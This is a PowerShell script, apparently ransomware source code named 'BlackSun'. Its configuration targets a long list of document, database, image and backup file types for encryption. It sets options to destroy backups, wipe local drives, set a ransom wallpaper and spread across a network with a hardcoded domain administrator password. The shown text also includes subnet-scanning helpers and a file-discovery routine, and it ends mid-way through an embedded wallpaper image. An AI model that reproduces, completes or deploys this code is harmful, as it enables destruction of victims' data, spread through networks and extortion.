#0.7
$process = Get-Process -Id $pid
$process.PriorityClass = 'AboveNormal'

####################VARIABLES####################
$strLogFile = $env:TEMP + "\BlackSun.log"
$strZipLogFile = $env:TEMP + "\BlackSun.log.zip"

$ErrorActionPreference = "SilentlyContinue"
Start-Transcript -IncludeInvocationHeader -Append -Path $strLogFile

#system
$strScriptName = $MyInvocation.MyCommand.Name
$strScriptPath = $MyInvocation.MyCommand.Path
$strMyDir = Split-Path $strScriptPath
$strMyDir = $strMyDir + "\"
$strMyName = $MyInvocation.MyCommand
$strMySelf = $strMyDir + $MyInvocation.MyCommand.Name
$intWinVer = [System.Environment]::OSVersion.Version | Select-Object -ExpandProperty Major

#safe run
[bool]$boolSafeRun = $false

#backup destroyer, if backup is larger then this value overwrite only X
$intMaxRandomDataBackupSizeMB = 300

#file extension
$ArrFileExt = "(\.ldf)$","(\.bak)$","(\.exp)$","(\.FORM)$","(\.PROG)$","(\.DATA)$","(\.edb)$","(\.FAD)$","(\.png)$","(\.bmp)$","(\.png)$","(\.p12)$","(\.mdf)$","(\.wb2)$","(\.psd)$","(\.p7c)$","(\.p7b)$",
"(\.asp)$","(\.php)$","(\.incpas)$","(\.7z)$","(\.zip)$","(\.rar)$","(\.drf)$","(\.blend)$","(\.apj)$","(\.3ds)$","(\.dwg)$","(\.dwl)$","(\.sda)$","(\.pat)$","(\.pfx)$","(\.crt)$","(\.cer)$","(\.der)$",
"(\.fxg)$","(\.fhd)$","(\.fh)$","(\.dxb)$","(\.drw)$","(\.design)$","(\.ddrw)$","(\.ddoc)$","(\.dcs)$","(\.csl)$","(\.csh)$","(\.cpi)$","(\.cgm)$","(\.cdx)$","(\.cdrw)$","(\.cdr6)$","(\.cdr5)$","(\.xlsm)$",
"(\.cdr4)$","(\.cdr3)$","(\.cdr)$","(\.awg)$","(\.ait)$","(\.ai)$","(\.agd1)$","(\.ycbcra)$","(\.x3f)$","(\.stx)$","(\.st8)$","(\.st7)$","(\.st6)$","(\.st5)$","(\.st4)$","(\.srw)$","(\.srf)$","(\.sr2)$",
"(\.sd1)$","(\.sd0)$","(\.rwz)$","(\.rwl)$","(\.rw2)$","(\.raw)$","(\.raf)$","(\.ra2)$","(\.ptx)$","(\.pef)$","(\.pcd)$","(\.orf)$","(\.nwb)$","(\.nrw)$","(\.nop)$","(\.nef)$","(\.ndd)$","(\.mrw)$","(\.xlsb)$",
"(\.mos)$","(\.mfw)$","(\.mef)$","(\.mdc)$","(\.iiq)$","(\.gry)$","(\.grey)$","(\.gray)$","(\.fpx)$","(\.fff)$","(\.exf)$","(\.erf)$","(\.dng)$","(\.dcr)$","(\.dc2)$","(\.crw)$","(\.p12)$","(\.xltx)$",
"(\.craw)$","(\.cr2)$","(\.cmt)$","(\.cib)$","(\.ce2)$","(\.ce1)$","(\.arw)$","(\.3pr)$","(\.3fr)$","(\.mpg)$","(\.jpeg)$","(\.jpg)$","(\.mdb)$","(\.sqlitedb)$","(\.sqlite3)$","(\.sqlite)$","(\.sql)$",
"(\.sdf)$","(\.sav)$","(\.sas7bdat)$","(\.s3db)$","(\.rdb)$","(\.psafe3)$","(\.nyf)$","(\.nx2)$","(\.nx1)$","(\.nsh)$","(\.nsg)$","(\.nsf)$","(\.nsd)$","(\.ns4)$","(\.ns3)$","(\.ns2)$","(\.myd)$",
"(\.kpdx)$","(\.kdbx)$","(\.idx)$","(\.ibz)$","(\.ibd)$","(\.fdb)$","(\.erbsql)$","(\.db3)$","(\.dbf)$","(\.db-journal)$","(\.cls)$","(\.bdb)$","(\.adb)$","(\.backupdb)$","(\.bik)$","(\.xlsx)$",
"(\.backup)$","(\.bkp)$","(\.moneywell)$","(\.mmw)$","(\.ibank)$","(\.hbk)$","(\.ffd)$","(\.dgc)$","(\.ddd)$","(\.dac)$","(\.cfp)$","(\.cdf)$","(\.bpw)$","(\.bgt)$","(\.acr)$","(\.ac2)$","(\.xltm)$",
"(\.ab4)$","(\.djvu)$","(\.pdf)$","(\.sxm)$","(\.odf)$","(\.std)$","(\.sxd)$","(\.otg)$","(\.sti)$","(\.sxi)$","(\.otp)$","(\.odg)$","(\.odp)$","(\.stc)$","(\.sxc)$","(\.ots)$","(\.ods)$","(\.sxg)$",
"(\.stw)$","(\.sxw)$","(\.odm)$","(\.oth)$","(\.ott)$","(\.odt)$","(\.odb)$","(\.csv)$","(\.rtf)$","(\.accdr)$","(\.accdt)$","(\.accde)$","(\.accdb)$","(\.sldm)$","(\.sldx)$","(\.ppsm)$","(\.ppsx)$",
"(\.ppam)$","(\.potm)$","(\.potx)$","(\.pptm)$","(\.pptx)$","(\.pps)$","(\.pot)$","(\.ppt)$","(\.xlw)$","(\.xll)$","(\.xlam)$","(\.xla)$","(\.dotx)$","(\.docm)$","(\.docx)$","(\.dot)$","(\.doc)$",
"(\.xlm)$","(\.xlt)$","(\.xls)$","(\.dotm)$"

#Skipped Paths and files
$ArrSkippedPaths = "\\AppData\\","\\Application Data\\","\\AppCache\\","\\Temporary Internet Files\\","\\INetCache\\","\\ProgramData\\","\\Program Files\\","\\Microsoft\\","\\Chrome\\","\\ConnectedDevicesPlatform\\","\\winnt\\","\\boot\\","\\Packages\\","\\Mozilla\\","Recycle","setup","install","Thumbs.db","Thumb.db","temp","tmp","System Volume Information","Microsoft","Windows","BlackSun","x86"

#destroy these backups
$ArrBackups = "(\.backup)$","(\.tib)$","(\.tibx)$","(\.vbk)$","(\.vib)$","(\.vrb)$","(\.vbm)$","(\.bco)$","(\.dem)$","(\.bkf)$","(\.gho)$","(\.iv2i)$","(\.bks)$","(\.gho)$","(\.vhdx)$"

#manual file list to encrypt 
[bool]$boolManualFileList = $false
#$ArrManualFileList = @('c:\test\test1.docx','c:\documents\doc1.docx')
$ArrManualFileList = @('')

#network propagation
[bool]$boolNetworkPropagation = $true
$strDomain = "KREISVERKEHR"
$strUsername = "administrator"
$strPassword = "altalt"
#$arrCustomSubnets = @('192.168.100.0/24')
$arrCustomSubnets = @('')

#encrypt at given time
$boolEncryptGivenTime = $false
$strStartTime = "24:00" #24 hour format

#wipe local drives
$boolWipeLocalDrives = true

#ftp log upload
$boolFtpLogUpload = $false

#set wallpaper
$boolSetWallPaper = $true

####################VARIABLES####################

####################FUNCTIONS####################


function Test-IfAlreadyRunning {
	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$ScriptName
	)
	Write-Host "testing if already running..." $strScriptName
	$PsScriptsRunning = Get-WmiObject win32_process | Where-Object { $_.processname -eq 'powershell.exe' } | Select-Object commandline,ProcessId

	foreach ($PsCmdLine in $PsScriptsRunning)
	{
		[int32]$OtherPID = $PsCmdLine.ProcessId
		[string]$OtherCmdLine = $PsCmdLine.commandline
		if (($OtherCmdLine -match $strScriptName) -and ($OtherPID -ne $PID))
		{
			Write-Host "PID [$OtherPID] is already running this script [$strScriptName]"
			Write-Host "Exiting this instance. (PID=[$PID])..."
			Start-Sleep -Second 7
			exit
		}
	}
}

function Enable-BitShift
{
	$Domain = [AppDomain]::CurrentDomain
	$DynAssembly = New-Object System.Reflection.AssemblyName -ArgumentList @('PoShBitwiseAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly,
		[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('PoShBitwiseModule',$False)
	$TypeBuilder = $ModuleBuilder.DefineType('PoShBitwiseBuilder',
		[System.Reflection.TypeAttributes]'Public, Sealed, AnsiClass, AutoClass',
		[Object])
	#endregion

	#region Define Lsh Method
	$MethodBuilder = $TypeBuilder.DefineMethod('Lsh',
		[System.Reflection.MethodAttributes]'Public,Static,HideBySig,NewSlot',
		[uint32],
		[type[]]([uint32],[uint32]))
	$MethodBuilder.SetImplementationFlags([System.Reflection.MethodImplAttributes]::IL)
	$ILGen = $MethodBuilder.GetILGenerator(2)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ldarg_1)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Shl)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ret)
	#endregion

	#region Define Rsh Method
	$MethodBuilder = $TypeBuilder.DefineMethod('Rsh',
		[System.Reflection.MethodAttributes]'Public,Static,HideBySig,NewSlot',
		[uint32],
		[type[]]([uint32],[uint32]))
	$MethodBuilder.SetImplementationFlags([System.Reflection.MethodImplAttributes]::IL)
	$ILGen = $MethodBuilder.GetILGenerator(2)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ldarg_1)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Shr)
	$ILGen.Emit([Reflection.Emit.OpCodes]::Ret)
	#endregion

	# Generate RuntimeType and assign to global variable
	$Global:Bitwise = $TypeBuilder.CreateType()
}

function ConvertTo-DecimalIP {
	[OutputType([System.UInt32])]
	param(
		[Parameter(Mandatory = $true,Position = 1,ValueFromPipeline = $true)]
		[ipaddress]$IPAddress
	)

	process {
		$Bytes = $IPAddress.GetAddressBytes()
		$Decimal = 0;
		for ($i = 0; $i -le 3; $i++) {
			#$Decimal += [UInt32]$Bytes[$i] -shl (8 * (3 - $i))
			$Decimal += $Bitwise::Lsh([uint32]$Bytes[$i],(8 * (3 - $i))) #powershell 2 compatible
		}

		return [uint32]$Decimal
	}
}

function ConvertTo-DottedDecimalIP {

	[OutputType([System.Net.IPAddress])]
	param(
		[Parameter(Mandatory = $true,Position = 1,ValueFromPipeline = $true)]
		[string]$IPAddress
	)

	process {
		switch -regex ($IPAddress) {
			"([01]{8}\.){3}[01]{8}" {
				return [ipaddress]([string]::Join('.',$($IPAddress -split '\.' | ForEach-Object { [Convert]::ToUInt32($_,2) })))
			}
			"\d" {
				$Decimal = [uint32]$IPAddress
				$DottedDecimalIP = ''
				for ($i = 3; $i -ge 0; $i --) {
					$Remainder = $Decimal % [math]::Pow(256,$i)

					$DottedDecimalIP += ($Decimal - $Remainder) / [math]::Pow(256,$i)
					if ($i -gt 0) {
						$DottedDecimalIP += '.'
					}

					$Decimal = $Remainder
				}

				$DottedIP = 3..0 | ForEach-Object {
					$Remainder = $IPAddress % [math]::Pow(256,$_)
					($IPAddress - $Remainder) / [math]::Pow(256,$_)
					$IPAddress = $Remainder
				}

				return [ipaddress]($DottedIP -join '.')
			}
			default {
				$ErrorRecord = New-Object System.Management.Automation.ErrorRecord (
					(New-Object ArgumentException 'Cannot convert this format.'),
					'UnrecognisedFormat',
					[System.Management.Automation.ErrorCategory]::InvalidArgument,
					$IPAddress
				)
				Write-Error -ErrorRecord $ErrorRecord
			}
		}
	}
}

function Get-NetworkRange {
	[OutputType([System.Net.IPAddress[]])]
	param(
		[Parameter(Mandatory = $true,Position = 1,ValueFromPipeline = $true)]
		[string]$IPAddress,

		[Parameter(Position = 2)]
		[string]$SubnetMask,

		[switch]$IncludeNetworkAndBroadcast
	)

	process {
		$null = $psboundparameters.Remove('IncludeNetworkAndBroadcast')
		try {
			$Network = ConvertToNetwork @psboundparameters
		} catch {
			throw $_
		}

		$DecimalIP = ConvertTo-DecimalIP $Network.IPAddress
		$DecimalMask = ConvertTo-DecimalIP $Network.SubnetMask

		$DecimalNetwork = $DecimalIP -band $DecimalMask
		$DecimalBroadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [uint32]::MaxValue)

		if (-not $IncludeNetworkAndBroadcast) {
			$DecimalNetwork += 1
			$DecimalBroadcast -= 1
		}

		for ($i = $DecimalNetwork; $i -le $DecimalBroadcast; $i++) {
			ConvertTo-DottedDecimalIP $i
		}
	}
}


function ConvertToNetwork {
	param(
		[Parameter(Mandatory = $true,Position = 1)]
		[string]$IPAddress,

		[Parameter(Position = 2)]
		[AllowNull()]
		[string]$SubnetMask
	)

	if (-not $Script:ValidSubnetMaskValues) {
		$Script:ValidSubnetMaskValues =
		"0.0.0.0","128.0.0.0","192.0.0.0",
		"224.0.0.0","240.0.0.0","248.0.0.0","252.0.0.0",
		"254.0.0.0","255.0.0.0","255.128.0.0","255.192.0.0",
		"255.224.0.0","255.240.0.0","255.248.0.0","255.252.0.0",
		"255.254.0.0","255.255.0.0","255.255.128.0","255.255.192.0",
		"255.255.224.0","255.255.240.0","255.255.248.0","255.255.252.0",
		"255.255.254.0","255.255.255.0","255.255.255.128","255.255.255.192",
		"255.255.255.224","255.255.255.240","255.255.255.248","255.255.255.252",
		"255.255.255.254","255.255.255.255"
	}

	$Network = [pscustomobject]@{
		IPAddress = $null
		SubnetMask = $null
		MaskLength = 0
	} | Add-Member -TypeName 'Indented.Net.IP.Network' -PassThru

	# Override ToString
	$Network | Add-Member ToString -MemberType ScriptMethod -Force -Value {
		'{0}/{1}' -f $this.IPAddress,$this.MaskLength
	}

	if (-not $psboundparameters.ContainsKey('SubnetMask') -or $SubnetMask -eq '') {
		$IPAddress,$SubnetMask = $IPAddress.Split('\/ ',[StringSplitOptions]::RemoveEmptyEntries)
	}

	# IPAddress

	while ($IPAddress.Split('.').Count -lt 4) {
		$IPAddress += '.0'
	}

	if ([ipaddress]::TryParse($IPAddress,[ref]$null)) {
		$Network.IPAddress = [ipaddress]$IPAddress
	} else {
		$ErrorRecord = New-Object System.Management.Automation.ErrorRecord (
			(New-Object ArgumentException 'Invalid IP address.'),
			'InvalidIPAddress',
			[System.Management.Automation.ErrorCategory]::InvalidArgument,
			$IPAddress
		)
		throw $ErrorRecord
	}

	# SubnetMask

	if ($null -eq $SubnetMask -or $SubnetMask -eq '') {
		$Network.SubnetMask = [ipaddress]$Script:ValidSubnetMaskValues[32]
		$Network.MaskLength = 32
	} else {
		$MaskLength = 0
		if ([int32]::TryParse($SubnetMask,[ref]$MaskLength)) {
			if ($MaskLength -ge 0 -and $MaskLength -le 32) {
				$Network.SubnetMask = [ipaddress]$Script:ValidSubnetMaskValues[$MaskLength]
				$Network.MaskLength = $MaskLength
			} else {
				$ErrorRecord = New-Object System.Management.Automation.ErrorRecord (
					(New-Object ArgumentException 'Mask length out of range (expecting 0 to 32).'),
					'InvalidMaskLength',
					[System.Management.Automation.ErrorCategory]::InvalidArgument,
					$SubnetMask
				)
				throw $ErrorRecord
			}
		} else {
			while ($SubnetMask.Split('.').Count -lt 4) {
				$SubnetMask += '.0'
			}
			$MaskLength = $Script:ValidSubnetMaskValues.IndexOf($SubnetMask)

			if ($MaskLength -ge 0) {
				$Network.SubnetMask = [ipaddress]$SubnetMask
				$Network.MaskLength = $MaskLength
			} else {
				$ErrorRecord = New-Object System.Management.Automation.ErrorRecord (
					(New-Object ArgumentException 'Invalid subnet mask.'),
					'InvalidSubnetMask',
					[System.Management.Automation.ErrorCategory]::InvalidArgument,
					$SubnetMask
				)
				throw $ErrorRecord
			}
		}
	}

	return $Network
}

function SafeRun {
	Write-Host "*** RUNNING IN SAFE MODE*** Only file discovery"
	GetDrives
	Write-Host ""
	Write-Host "GETTING FILES:"

	$strRemoteDrivesFiles = $env:TEMP + "\BlackSun_DRIVE_REMOTE*"
	$arrRemoteDrives = Get-ChildItem -Force -Path $strRemoteDrivesFiles | Select-Object -ExpandProperty Fullname

	foreach ($strRemoteDriveFile in $arrRemoteDrives)
	{
		$strDriveLetter = $strRemoteDriveFile.SubString($strRemoteDriveFile.get_Length() - 1)
		$strDrivePath = $strDriveLetter + ":\"
		$strFilesOnDriveFile = $env:TEMP + "\BlackSun_FILESON_REMOTE_" + $strDriveLetter
		$strBackupOnDriveFile = $env:TEMP + "\BlackSun_BACKUPS_REMOTE_" + $strDriveLetter
		GetFiles $strDrivePath $strFilesOnDriveFile $strBackupOnDriveFile
	}

	$strLocalDrivesFiles = $env:TEMP + "\BlackSun_DRIVE_LOCAL*"
	$arrLocalDrives = Get-ChildItem -Force -Path $strLocalDrivesFiles | Select-Object -ExpandProperty Fullname

	foreach ($strLocalDriveFile in $arrLocalDrives)
	{
		$strDriveLetter = $strLocalDriveFile.SubString($strLocalDriveFile.get_Length() - 1)
		$strDrivePath = $strDriveLetter + ":\"
		$strFilesOnDriveFile = $env:TEMP + "\BlackSun_FILESON_LOCAL_" + $strDriveLetter
		$strBackupOnDriveFile = $env:TEMP + "\BlackSun_BACKUPS_LOCAL_" + $strDriveLetter
		GetFiles $strDrivePath $strFilesOnDriveFile $strBackupOnDriveFile
	}

}


function SetBsunWall () {

	$BlackSun = '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
